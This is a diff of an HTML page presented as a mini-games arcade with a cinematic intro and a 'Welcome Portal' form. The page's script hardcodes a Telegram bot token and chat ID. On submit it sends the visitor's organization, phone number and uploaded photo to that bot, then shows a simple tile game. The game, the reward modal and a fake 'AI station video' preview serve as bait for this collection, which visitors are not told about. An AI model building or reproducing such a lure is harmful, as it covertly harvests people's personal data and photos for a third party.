@@ -6,110 +6,203 @@
     <title>Charming Mini-Games Arcade</title>
     <style>
         :root {
-            --bg-primary: #0f1020;
-            --bg-card: rgba(255, 255, 255, 0.04);
-            --border-glass: rgba(255, 255, 255, 0.1);
+            --bg-primary: #ffffff;
+            --bg-card: #ffffff;
             --accent-pink: #ff477e;
-            --accent-cyan: #00f2fe;
-            --accent-gold: #ffd700;
-            --text-main: #ffffff;
+            --accent-cyan: #007bff;
+            --text-main: #1e293b;
         }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: radial-gradient(circle at center, #1b1c3a 0%, var(--bg-primary) 100%);
+            background: #ffffff;
             color: var(--text-main);
             text-align: center;
             margin: 0;
             padding: 0;
-            min-height: 90vh;
+            width: 100vw;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-x: hidden;
+            overflow: hidden;
         }
 
         .screen {
             display: none;
             width: 100%;
-            max-width: 620px;
-            padding: 20px;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
             box-sizing: border-box;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
+            padding: 20px;
             animation: fadeIn 0.4s ease-in-out;
         }
 
-        .screen.fullscreen-puzzle {
-            max-width: 98vw;
-            width: 98vw;
-            padding: 10px;
-        }
-
-        .active {
+        .screen.active {
             display: flex;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: scale(0.98); }
+            to { opacity: 1; transform: scale(1); }
         }
 
-        .arcade-card, form {
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border-glass);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        /* Fullscreen Cinematic Intro Stage (Full Light Blue Theme) */
+        #walkingScreen {
+            background: radial-gradient(circle at center, #38bdf8 0%, #0284c7 100%);
+            z-index: 10;
+        }
+
+        .cinematic-stage-full {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            background: radial-gradient(circle at center, #38bdf8 0%, #0369a1 100%);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .cinematic-stage-full::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle 500px at 50% 55%, rgba(255,255,255,0.3) 0%, rgba(2,132,199,0.85) 85%);
+            pointer-events: none;
+        }
+
+        .stage-bag {
+            position: absolute;
+            bottom: 33vh;
+            left: 50%;
+            transform: translateX(-50%) scale(0);
+            font-size: 110px;
+            z-index: 2;
+            opacity: 0;
+            animation: bagDrop 5s ease forwards;
+        }
+
+        @keyframes bagDrop {
+            0% { opacity: 0; transform: translateX(-50%) scale(0); }
+            30% { opacity: 1; transform: translateX(-50%) scale(1.2); }
+            35% { opacity: 1; transform: translateX(-50%) scale(1); }
+            100% { opacity: 1; transform: translateX(-50%) scale(1); }
+        }
+
+        .walker-character {
+            position: absolute;
+            bottom: 31vh;
+            font-size: 135px;
+            z-index: 3;
+            animation: exactCinematicSequence 5s ease forwards;
+        }
+
+        @keyframes exactCinematicSequence {
+            0% { transform: translateX(-350px); }
+            28% { transform: translateX(-20px); }
+            32% { transform: translateX(-20px) translateY(10px); }
+            42% { transform: translateX(100px); }
+            45% { transform: translateX(100px) scaleX(-1); }
+            68% { transform: translateX(100px) scaleX(-1) translateY(0px); }
+            74% { transform: translateX(100px) scaleX(-1) translateY(-110px) scale(1.2); }
+            82% { transform: translateX(100px) scaleX(-1) translateY(0px); opacity: 1; }
+            100% { transform: translateX(100px) scaleX(-1) translateY(0px); opacity: 0; }
+        }
+
+        .torch-beam-title {
+            position: absolute;
+            bottom: 16vh;
+            color: #ffffff;
+            font-size: 24px;
+            font-family: monospace;
+            font-weight: bold;
+            letter-spacing: 3px;
+            z-index: 4;
+            animation: pulseGlow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; text-shadow: 0 0 20px #ffffff, 0 0 10px #0284c7; }
+        }
+
+        /* Form Screen Area Background (White) with Dark Form Layout Card */
+        #formScreen {
+            background: #ffffff;
+        }
+
+        .screen.active#formScreen {
+            animation: popOutFromBag 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.3) forwards;
+        }
+
+        @keyframes popOutFromBag {
+            0% { transform: scale(0.05) translateY(180px); opacity: 0; }
+            60% { transform: scale(1.05) translateY(-15px); opacity: 1; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        form {
+            background: rgba(15, 16, 32, 0.95);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 35px;
+            border-radius: 24px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
             width: 100%;
-            max-width: 320px;
+            max-width: 380px;
             box-sizing: border-box;
             text-align: left;
+            color: #ffffff;
         }
         
-        h2 { margin-top: 0; font-weight: 600; letter-spacing: 0.5px; font-size: 19px; }
-        label { font-size: 14px; color: #a0aec0; font-weight: 500; }
+        form h2 { margin-top: 0; font-weight: 600; letter-spacing: 0.5px; font-size: 21px; color: #ffffff; }
+        form label { font-size: 13px; color: #a0aec0; font-weight: 600; letter-spacing: 0.5px; }
         
-        input, select {
+        form input {
             width: 100%;
-            padding: 10px 12px;
-            margin-top: 5px;
-            margin-bottom: 15px;
-            border-radius: 8px;
-            border: 1px solid var(--border-glass);
-            background: rgba(0, 0, 0, 0.2);
+            padding: 12px 14px;
+            margin-top: 6px;
+            margin-bottom: 18px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            background: rgba(0, 0, 0, 0.4);
             color: white;
             font-size: 15px;
             box-sizing: border-box;
             outline: none;
             transition: 0.3s;
         }
-        input:focus, select:focus {
-            border-color: var(--accent-cyan);
-            box-shadow: 0 0 10px rgba(0,242,254,0.3);
+        form input:focus {
+            border-color: #00f2fe;
+            background: rgba(0, 0, 0, 0.6);
+            box-shadow: 0 0 12px rgba(0, 242, 254, 0.3);
         }
-        select option { background: #1a1a2e; color: white; }
 
-        input[type="submit"] {
+        form input[type="submit"] {
             display: block;
             width: 100%;
-            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            background: linear-gradient(135deg, #0284c7, #0369a1);
             color: white;
             border: none;
-            padding: 12px;
+            padding: 14px;
             cursor: pointer;
-            border-radius: 8px;
+            border-radius: 10px;
             font-weight: bold;
             font-size: 16px;
-            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
+            box-shadow: 0 5px 15px rgba(2, 132, 199, 0.4);
             transition: 0.3s;
             margin-top: 5px;
             margin-bottom: 0;
         }
-        input[type="submit"]:hover {
+        form input[type="submit"]:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 65, 108, 0.6);
+            box-shadow: 0 8px 22px rgba(2, 132, 199, 0.6);
         }
 
         #aiVideoPreviewContainer {
@@ -121,10 +214,10 @@
         .ai-video-box {
             position: relative;
             width: 100%;
-            height: 150px;
+            height: 140px;
             border-radius: 10px;
             overflow: hidden;
-            border: 2px solid var(--accent-cyan);
+            border: 2px solid #00f2fe;
             box-shadow: 0 0 15px rgba(0, 242, 254, 0.4);
             background: #000;
         }
@@ -142,17 +235,17 @@
         .station-overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(to bottom, rgba(0,242,254,0.1), transparent 50%, rgba(0,0,0,0.3));
+            background: linear-gradient(to bottom, rgba(0, 242, 254, 0.1), transparent 50%, rgba(0,0,0,0.3));
             pointer-events: none;
         }
         .ai-badge {
             position: absolute;
             top: 6px; right: 6px;
-            background: rgba(0, 0, 0, 0.75);
-            border: 1px solid var(--accent-cyan);
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00f2fe;
             padding: 2px 8px;
             font-size: 10px;
-            color: var(--accent-cyan);
+            color: #00f2fe;
             border-radius: 4px;
             font-family: monospace;
             font-weight: bold;
@@ -161,7 +254,7 @@
             position: absolute;
             bottom: 0; left: 0;
             height: 3px;
-            background: var(--accent-cyan);
+            background: #00f2fe;
             width: 100%;
             animation: timerShrink 10s linear infinite;
         }
@@ -170,181 +263,87 @@
             100% { width: 0%; }
         }
 
+        /* Remaining Screens (Full White Theme) */
+        #gameScreen {
+            background: #ffffff;
+            color: #1e293b;
+        }
+
+        #gameScreen h2 {
+            color: #0f172a;
+        }
+
         .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: 1px solid var(--border-glass);
+            background: #f1f5f9;
+            color: #334155;
+            border: 1px solid #cbd5e1;
             padding: 10px 20px;
             font-size: 14px;
+            font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
             transition: 0.3s;
             margin-top: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
-        .btn-secondary:hover { background: rgba(255, 255, 255, 0.2); }
+        .btn-secondary:hover { background: #e2e8f0; }
 
         .puzzle-status-badge {
-            background: rgba(0, 242, 254, 0.12);
-            border: 1px solid rgba(0, 242, 254, 0.4);
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
             padding: 6px 14px;
             border-radius: 20px;
             font-size: 14px;
             font-weight: bold;
             margin-bottom: 8px;
             display: inline-block;
-            color: var(--accent-cyan);
-            box-shadow: 0 0 12px rgba(0, 242, 254, 0.2);
+            color: #475569;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.03);
         }
 
         .game-frame {
             position: relative;
             width: 100%;
-            height: 350px;
-            background: rgba(0,0,0,0.4);
-            border-radius: 12px;
-            margin: 5px 0;
+            max-width: 420px;
+            height: 340px;
+            background: #ffffff;
+            border-radius: 20px;
+            margin: 10px 0;
             overflow: hidden;
-            border: 1px solid var(--border-glass);
+            border: 1px solid #e2e8f0;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
         }
 
-        /* --- GAME 1: CYBER MATRIX GRID (Solomon Mulu) --- */
         .matrix-grid {
             display: grid;
-            grid-template-columns: repeat(3, 75px);
-            gap: 10px;
+            grid-template-columns: repeat(3, 80px);
+            gap: 12px;
         }
         .matrix-tile {
-            width: 75px;
-            height: 75px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border-glass);
-            border-radius: 10px;
+            width: 80px;
+            height: 80px;
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 12px;
             cursor: pointer;
             transition: 0.15s;
         }
         .matrix-tile.lit {
             background: var(--accent-pink);
-            box-shadow: 0 0 20px var(--accent-pink);
+            box-shadow: 0 0 15px rgba(255, 71, 126, 0.4);
+            border-color: var(--accent-pink);
         }
 
-        /* --- GAME 2: STELLAR PRECISION SLIDER (Judi Kiros) --- */
-        .slider-arena {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, #151838 0%, #090a16 100%);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .slider-track {
-            position: relative;
-            width: 80%;
-            height: 24px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 12px;
-            border: 1px solid var(--border-glass);
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-        .slider-target-zone {
-            position: absolute;
-            top: 0;
-            width: 60px;
-            height: 100%;
-            background: rgba(0, 242, 254, 0.4);
-            border-left: 2px solid var(--accent-cyan);
-            border-right: 2px solid var(--accent-cyan);
-        }
-        .slider-thumb {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 12px;
-            height: 100%;
-            background: var(--accent-gold);
-            box-shadow: 0 0 12px var(--accent-gold);
-            border-radius: 4px;
-        }
-
-        /* --- GAME 3: COSMIC MEMORY FLASH (Selam Kebede - 10 Levels) --- */
-        .memory-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 85px);
-            gap: 12px;
-        }
-        .memory-tile {
-            width: 85px;
-            height: 85px;
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid var(--border-glass);
-            border-radius: 12px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .memory-tile.active-flash {
-            background: var(--accent-cyan);
-            box-shadow: 0 0 20px var(--accent-cyan);
-        }
-
-        /* --- GAME 4: FULL-SCREEN PHOTO PUZZLE (Selam Girma) --- */
-        .fullscreen-puzzle-frame {
-            width: 100%;
-            height: 72vh;
-            max-height: 650px;
-            background: rgba(0,0,0,0.6);
-            border-radius: 16px;
-            border: 1px solid var(--border-glass);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 10px;
-            box-sizing: border-box;
-        }
-        .puzzle-wrapper {
-            position: relative;
-            width: 100%;
-            max-width: 580px;
-            height: 100%;
-            max-height: 580px;
-            aspect-ratio: 1 / 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: auto;
-        }
-        .puzzle-grid {
-            display: grid;
-            gap: 3px;
-            background: #111;
-            padding: 5px;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-            height: 100%;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
-        }
-        .puzzle-tile {
-            width: 100%;
-            height: 100%;
-            background-repeat: no-repeat;
-            border: 1px solid rgba(255,255,255,0.3);
-            border-radius: 4px;
-            transition: transform 0.15s, border-color 0.15s;
-        }
-        .puzzle-tile:hover { border-color: var(--accent-cyan); }
-
-        /* Reward Modal & Bubbles */
+        /* Reward Modal */
         #rewardModal {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(10, 11, 26, 0.85);
-            backdrop-filter: blur(10px);
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(6px);
             display: none;
             justify-content: center;
             align-items: center;
@@ -353,24 +352,23 @@
             animation: fadeIn 0.3s ease;
         }
         .reward-card {
-            background: linear-gradient(135deg, rgba(255,255,255,0.15), rgba(255,255,255,0.05));
-            border: 2px solid rgba(255,255,255,0.3);
-            padding: 30px;
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            padding: 35px;
             border-radius: 24px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             max-width: 380px;
             width: 90%;
-            position: relative;
-            z-index: 1000;
+            color: #1e293b;
         }
         .big-white-choco {
             width: 160px;
             height: 120px;
-            background: linear-gradient(145deg, #ffffff, #e0e0e0);
+            background: linear-gradient(145deg, #ffffff, #f1f5f9);
             border-radius: 16px;
             margin: 20px auto;
-            box-shadow: 0 10px 25px rgba(255,255,255,0.3), inset 0 2px 5px rgba(255,255,255,0.8);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.06), inset 0 2px 5px rgba(255,255,255,0.8);
             display: flex;
             flex-direction: column;
             justify-content: space-around;
@@ -379,25 +377,10 @@
             animation: floatChoco 3s ease-in-out infinite;
         }
         .choco-row { display: flex; justify-content: space-around; gap: 8px; }
-        .choco-block { flex: 1; height: 30px; background: rgba(0,0,0,0.06); border-radius: 6px; border: 1px solid rgba(0,0,0,0.08); box-shadow: inset 0 2px 3px rgba(255,255,255,0.7); }
+        .choco-block { flex: 1; height: 30px; background: #e2e8f0; border-radius: 6px; border: 1px solid #cbd5e1; box-shadow: inset 0 2px 3px rgba(255,255,255,0.7); }
         @keyframes floatChoco {
             0%, 100% { transform: translateY(0px) rotate(0deg); }
             50% { transform: translateY(-8px) rotate(1deg); }
-        }
-        .bubble {
-            position: absolute;
-            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.8), rgba(255,255,255,0.1));
-            border-radius: 50%;
-            box-shadow: inset 0 0 10px rgba(255,255,255,0.8), 0 0 15px rgba(0,242,254,0.3);
-            animation: riseBubble 4s ease-in-out infinite;
-            z-index: 998;
-            pointer-events: none;
-        }
-        @keyframes riseBubble {
-            0% { transform: translateY(100vh) scale(0.4); opacity: 0; }
-            20% { opacity: 0.8; }
-            80% { opacity: 0.8; }
-            100% { transform: translateY(-100px) scale(1.2); opacity: 0; }
         }
     </style>
 </head>
@@ -406,19 +389,28 @@
     <!-- REWARD MODAL -->
     <div id="rewardModal">
         <div class="reward-card">
-            <h1 style="margin: 0 0 10px 0; color: var(--accent-gold);">🎉 Level Completed!</h1>
-            <p style="color: #e2e8f0; margin: 0; font-size: 15px;">You earned the ultimate prize:</p>
+            <h1 style="margin: 0 0 10px 0; color: #0f172a;">🎉 Level Completed!</h1>
+            <p style="color: #64748b; margin: 0; font-size: 15px;">You earned the ultimate prize:</p>
             <div class="big-white-choco">
                 <div class="choco-row"><div class="choco-block"></div><div class="choco-block"></div><div class="choco-block"></div></div>
                 <div class="choco-row"><div class="choco-block"></div><div class="choco-block"></div><div class="choco-block"></div></div>
             </div>
-            <h3 style="color: var(--accent-cyan); margin: 5px 0 15px 0;">🍫 Big White Chocolate Bar!</h3>
-            <button class="btn-primary" onclick="closeRewardModal()" style="width:100%; padding: 12px; background: linear-gradient(135deg, #ff416c, #ff4b2b); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">✨ Continue</button>
+            <h3 style="color: #0284c7; margin: 5px 0 20px 0;">🍫 Big White Chocolate Bar!</h3>
+            <button onclick="closeRewardModal()" style="width:100%; padding: 14px; background: linear-gradient(135deg, #0284c7, #0369a1); color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 12px rgba(2,132,199,0.3);">✨ Continue</button>
         </div>
     </div>
 
-    <!-- FORM SCREEN -->
-    <div id="formScreen" class="screen active">
+    <!-- FULLSCREEN CINEMATIC INTRO SCREEN (Full Light Blue) -->
+    <div id="walkingScreen" class="screen active">
+        <div class="cinematic-stage-full">
+            <div class="stage-bag" id="stageBag">🎒</div>
+            <div class="walker-character" id="walkerChar">🧳🚶</div>
+            <div class="torch-beam-title" id="stageText">✨ CARRYING BAG...</div>
+        </div>
+    </div>
+
+    <!-- FORM SCREEN (Welcome Portal - Dark Theme Card on White Background) -->
+    <div id="formScreen" class="screen">
         <form id="myForm"> 
             <h2>✨ Welcome Portal</h2>
             <label>ORGANIZATION</label>
@@ -427,19 +419,11 @@
             <label>PHONE NUMBER</label>
             <input type="number" id="phone" name="phone" placeholder="Enter phone number..." required>
 
-            <label>CHOOSE YOUR FRIEND</label>
-            <select id="loved" name="loved" onchange="updateSelectedFriend()">
-                <option>Solomon Mulu</option>
-                <option>Judi Kiros</option>
-                <option>Selam Kebede</option>
-                <option>Selam Girma</option>
-            </select>
-
             <label>UPLOAD PHOTO (FOR STATION DISPLAY)</label>
             <input type="file" id="photoFile" accept="image/*" onchange="previewStationVideoEffect(event)" required>
 
             <div id="aiVideoPreviewContainer">
-                <p style="font-size: 12px; color: var(--accent-cyan); margin: 0 0 5px 0;">🚉 10s Station Walking Display:</p>
+                <p style="font-size: 12px; color: #00f2fe; margin: 0 0 5px 0;">🚉 10s Station Walking Display:</p>
                 <div class="ai-video-box">
                     <div class="station-overlay"></div>
                     <img id="stationVideoImg" src="" alt="Station Walking Video Output">
@@ -452,11 +436,11 @@
         </form>
     </div>
 
-    <!-- GAME 1: SOLOMON MULU (Cyber Matrix Grid) -->
-    <div id="game1Screen" class="screen">
-        <h2 id="g1Title">⚡ Cyber Matrix Grid: Solomon Mulu</h2>
+    <!-- GAME SCREEN: CYBER MATRIX GRID (White Theme) -->
+    <div id="gameScreen" class="screen">
+        <h2 id="gTitle">⚡ Cyber Matrix Grid Challenge</h2>
         <div class="puzzle-status-badge">Score: <span id="matrixScore">0</span> / 5 | Time: <span id="matrixTimer">15</span>s</div>
-        <div class="game-frame" style="flex-direction: column; justify-content: center;">
+        <div class="game-frame">
             <div class="matrix-grid" id="matrixGrid">
                 <div class="matrix-tile" onclick="handleMatrixClick(0)"></div>
                 <div class="matrix-tile" onclick="handleMatrixClick(1)"></div>
@@ -470,106 +454,51 @@
             </div>
         </div>
         <div style="display: flex; gap: 10px;">
-            <button id="startMatrixBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: var(--accent-cyan); color: #000; font-weight: bold;" onclick="startMatrixGame()">▶ Start Matrix Game</button>
-            <button id="matrixRestartBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: #10b981; display: none;" onclick="startMatrixGame()">🔄 Play Again</button>
+            <button id="startMatrixBtn" class="btn-secondary" style="margin-top: 0; padding: 10px 20px; background: #0284c7; color: #fff; font-weight: bold; border: none;" onclick="startMatrixGame()">▶ Start Game</button>
+            <button id="matrixRestartBtn" class="btn-secondary" style="margin-top: 0; padding: 10px 20px; background: #10b981; display: none; color: #fff; font-weight: bold; border: none;" onclick="startMatrixGame()">🔄 Play Again</button>
         </div>
         <button class="btn-secondary" onclick="switchScreen('formScreen')">⬅ Back to Form</button>
-    </div>
-
-    <!-- GAME 2: JUDI KIROS (Stellar Precision Slider) -->
-    <div id="game2Screen" class="screen">
-        <h2 id="g2Title">🎯 Stellar Precision Slider: Judi Kiros</h2>
-        <div class="puzzle-status-badge">Score: <span id="sliderScore">0</span> / 5 Success</div>
-        <div class="game-frame" style="padding: 0;">
-            <div class="slider-arena">
-                <p style="color:var(--accent-cyan); margin-bottom:15px; font-size:13px;">Tap Lock when the glowing thumb is inside the cyan target zone!</p>
-                <div class="slider-track" id="sliderTrack">
-                    <div class="slider-target-zone" id="sliderTargetZone"></div>
-                    <div class="slider-thumb" id="sliderThumb"></div>
-                </div>
-                <button id="sliderLockBtn" class="btn-secondary" style="margin-top: 0; background: var(--accent-cyan); color: #000; font-weight: bold;" onclick="lockSlider()">🔒 Lock Position</button>
-                <button id="sliderRestartBtn" class="btn-secondary" style="margin-top: 0; background: #10b981; display: none;" onclick="startSliderGame()">🔄 Play Again</button>
-            </div>
-        </div>
-        <button class="btn-secondary" onclick="switchScreen('formScreen')">⬅ Back to Form</button>
-    </div>
-
-    <!-- GAME 3: SELAM KEBEDE (Cosmic Memory Flash - 10 Levels) -->
-    <div id="game3Screen" class="screen">
-        <h2 id="g3Title">🌌 Cosmic Memory Flash: Selam Kebede</h2>
-        <div class="puzzle-status-badge">Level: <span id="memoryLevel">1</span> / 10 | <span id="memoryStatusText">Watch the sequence!</span></div>
-        <div class="game-frame" style="flex-direction: column; justify-content: center;">
-            <div class="memory-grid" id="memoryGrid">
-                <div class="memory-tile" onclick="handleMemoryClick(0)"></div>
-                <div class="memory-tile" onclick="handleMemoryClick(1)"></div>
-                <div class="memory-tile" onclick="handleMemoryClick(2)"></div>
-                <div class="memory-tile" onclick="handleMemoryClick(3)"></div>
-                <div class="memory-tile" onclick="handleMemoryClick(4)"></div>
-                <div class="memory-tile" onclick="handleMemoryClick(5)"></div>
-            </div>
-        </div>
-        <div style="display: flex; gap: 10px;">
-            <button id="startMemoryBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: var(--accent-cyan); color: #000; font-weight: bold;" onclick="startMemoryGame()">▶ Start Memory Game</button>
-            <button id="memoryRestartBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: #10b981; display: none;" onclick="startMemoryGame()">🔄 Play Again</button>
-        </div>
-        <button class="btn-secondary" onclick="switchScreen('formScreen')">⬅ Back to Form</button>
-    </div>
-
-    <!-- GAME 4: SELAM GIRMA (Full-Screen Photo Puzzle) -->
-    <div id="game4Screen" class="screen fullscreen-puzzle">
-        <h2 id="g4Title" style="margin-bottom: 5px;">🧩 Full-Screen Photo Puzzle: Selam Girma</h2>
-        <div style="margin-bottom: 5px; width: 100%; display: flex; justify-content: center; gap: 10px; align-items: center;">
-            <select id="puzzleLevelSelect" onchange="changePuzzleLevel()" style="margin-bottom: 0; width: 180px; padding: 6px;">
-                <option value="1">Level 1 (2x2 - Easy)</option>
-                <option value="2">Level 2 (3x3 - Normal)</option>
-                <option value="3" selected>Level 3 (4x4 - Medium)</option>
-                <option value="4">Level 4 (5x5 - Hard)</option>
-                <option value="5">Level 5 (6x6 - Expert)</option>
-            </select>
-            <div id="puzzleStatus" class="puzzle-status-badge" style="margin-bottom: 0;">Moves: <span id="moveCount">0</span> / <span id="moveLimitDisplay">35</span> limit</div>
-        </div>
-        <div class="fullscreen-puzzle-frame">
-            <div class="puzzle-wrapper">
-                <div class="puzzle-grid" id="puzzleGrid"></div>
-            </div>
-        </div>
-        <div style="display: flex; gap: 10px; margin-top: 8px; justify-content: center;">
-            <button id="startPuzzleBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: var(--accent-cyan); color: #000; font-weight: bold;" onclick="initPuzzleGame()">▶ Start Level</button>
-            <button id="replayPuzzleBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: #10b981; display: none;" onclick="initPuzzleGame()">🔄 Next Level / Replay</button>
-            <button id="gameOverBtn" class="btn-secondary" style="margin-top: 0; padding: 8px 15px; background: #ef4444; display: none;" onclick="initPuzzleGame()">❌ Try Again</button>
-            <button class="btn-secondary" style="margin-top: 0;" onclick="switchScreen('formScreen')">⬅ Back to Form</button>
-        </div>
     </div>
 
     <script>
         const botToken = '8605940388:AAGVwcFM9p6fOdo1t8pqEvOQ9_pCatkU4J0';
         const chatId = '5729062534';
         let customUploadedImageUrl = '';
-        let imageDimensions = { width: 300, height: 300 };
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const walker = document.getElementById('walkerChar');
+            const stageText = document.getElementById('stageText');
+
+            setTimeout(() => {
+                walker.innerText = "🚶"; 
+                stageText.innerText = "✨ PLACING BAG ON GROUND...";
+            }, 1600);
+
+            setTimeout(() => {
+                walker.innerText = "👉"; 
+                stageText.innerText = "✨ POINTING TO BAG...";
+            }, 2300);
+
+            setTimeout(() => {
+                walker.innerText = "🦘"; 
+                stageText.innerText = "✨ LOGIN PAGE POPS OUT!";
+            }, 3600);
+
+            setTimeout(() => {
+                switchScreen('formScreen');
+            }, 4800);
+        });
 
         function switchScreen(screenId) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            const target = document.getElementById(screenId);
-            target.classList.add('active');
+            document.getElementById(screenId).classList.add('active');
             stopAllGames();
-            if(screenId === 'game1Screen') resetMatrixGame();
-            if(screenId === 'game2Screen') startSliderGame();
-            if(screenId === 'game3Screen') resetMemoryGame();
-            if(screenId === 'game4Screen') preparePuzzleScreen();
+            if(screenId === 'gameScreen') resetMatrixGame();
         }
 
         function stopAllGames() {
             clearInterval(matrixTimerInterval);
             clearTimeout(matrixSpawnTimeout);
-            cancelAnimationFrame(sliderAnimId);
-        }
-
-        function updateSelectedFriend() {
-            const friendName = document.getElementById('loved').value;
-            document.getElementById('g1Title').innerText = `⚡ Cyber Matrix Grid: ${friendName}`;
-            document.getElementById('g2Title').innerText = `🎯 Stellar Precision Slider: ${friendName}`;
-            document.getElementById('g3Title').innerText = `🌌 Cosmic Memory Flash: ${friendName}`;
-            document.getElementById('g4Title').innerText = `🧩 Full-Screen Photo Puzzle: ${friendName}`;
         }
 
         function previewStationVideoEffect(event) {
@@ -587,25 +516,9 @@
 
         document.getElementById('myForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const photoInput = document.getElementById('photoFile');
-            if (photoInput.files && photoInput.files[0]) {
-                const imgTest = new Image();
-                imgTest.onload = function() {
-                    imageDimensions.width = imgTest.width;
-                    imageDimensions.height = imgTest.height;
-                    proceedAfterPhotoLoad();
-                };
-                imgTest.src = customUploadedImageUrl;
-            } else {
-                alert("Please upload a photo!");
-            }
-        });
-
-        async function proceedAfterPhotoLoad() {
-            const selectedFriend = document.getElementById('loved').value;
             const name = document.getElementById('username').value;
             const phone = document.getElementById('phone').value;
-            const message = `📋 New Portal Submission:\nOrganization: ${name}\nPhone: ${phone}\nSelected Friend: ${selectedFriend}`;
+            const message = `📋 New Portal Submission:\nOrganization: ${name}\nPhone: ${phone}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -619,20 +532,17 @@
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', photoInput.files[0]);
-                    formData.append('caption', `Station video photo submission for ${selectedFriend}`);
+                    formData.append('caption', `Station video photo submission for ${name}`);
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                 }
 
-                if (selectedFriend === 'Solomon Mulu') switchScreen('game1Screen');
-                else if (selectedFriend === 'Judi Kiros') switchScreen('game2Screen');
-                else if (selectedFriend === 'Selam Kebede') switchScreen('game3Screen');
-                else if (selectedFriend === 'Selam Girma') switchScreen('game4Screen');
+                switchScreen('gameScreen');
             } catch (error) {
                 console.error('Error:', error);
+                switchScreen('gameScreen');
             }
-        }
+        });
 
-        // --- GAME 1: SOLOMON MULU (Cyber Matrix Grid) ---
         let matrixScore = 0, matrixTimer = 15, matrixTimerInterval, matrixSpawnTimeout, activeMatrixIndex = -1;
 
         function resetMatrixGame() {
@@ -671,7 +581,7 @@
             activeMatrixIndex = Math.floor(Math.random() * tiles.length);
             tiles[activeMatrixIndex].classList.add('lit');
 
-            matrixSpawnTimeout = setTimeout(spawnMatrixTarget, 1100);
+            matrixSpawnTimeout = setTimeout(spawnMatrixTarget, 1000);
         }
 
         function handleMatrixClick(index) {
@@ -686,292 +596,14 @@
                     stopAllGames();
                     document.getElementById('matrixRestartBtn').style.display = 'inline-block';
                     document.getElementById('rewardModal').style.display = 'flex';
-                    createFloatingBubbles();
                 } else {
                     spawnMatrixTarget();
                 }
             }
         }
 
-        // --- GAME 2: JUDI KIROS (Stellar Precision Slider) ---
-        let sliderScore = 0, sliderPos = 0, sliderDir = 2, sliderAnimId = null;
-
-        function startSliderGame() {
-            stopAllGames();
-            sliderScore = 0;
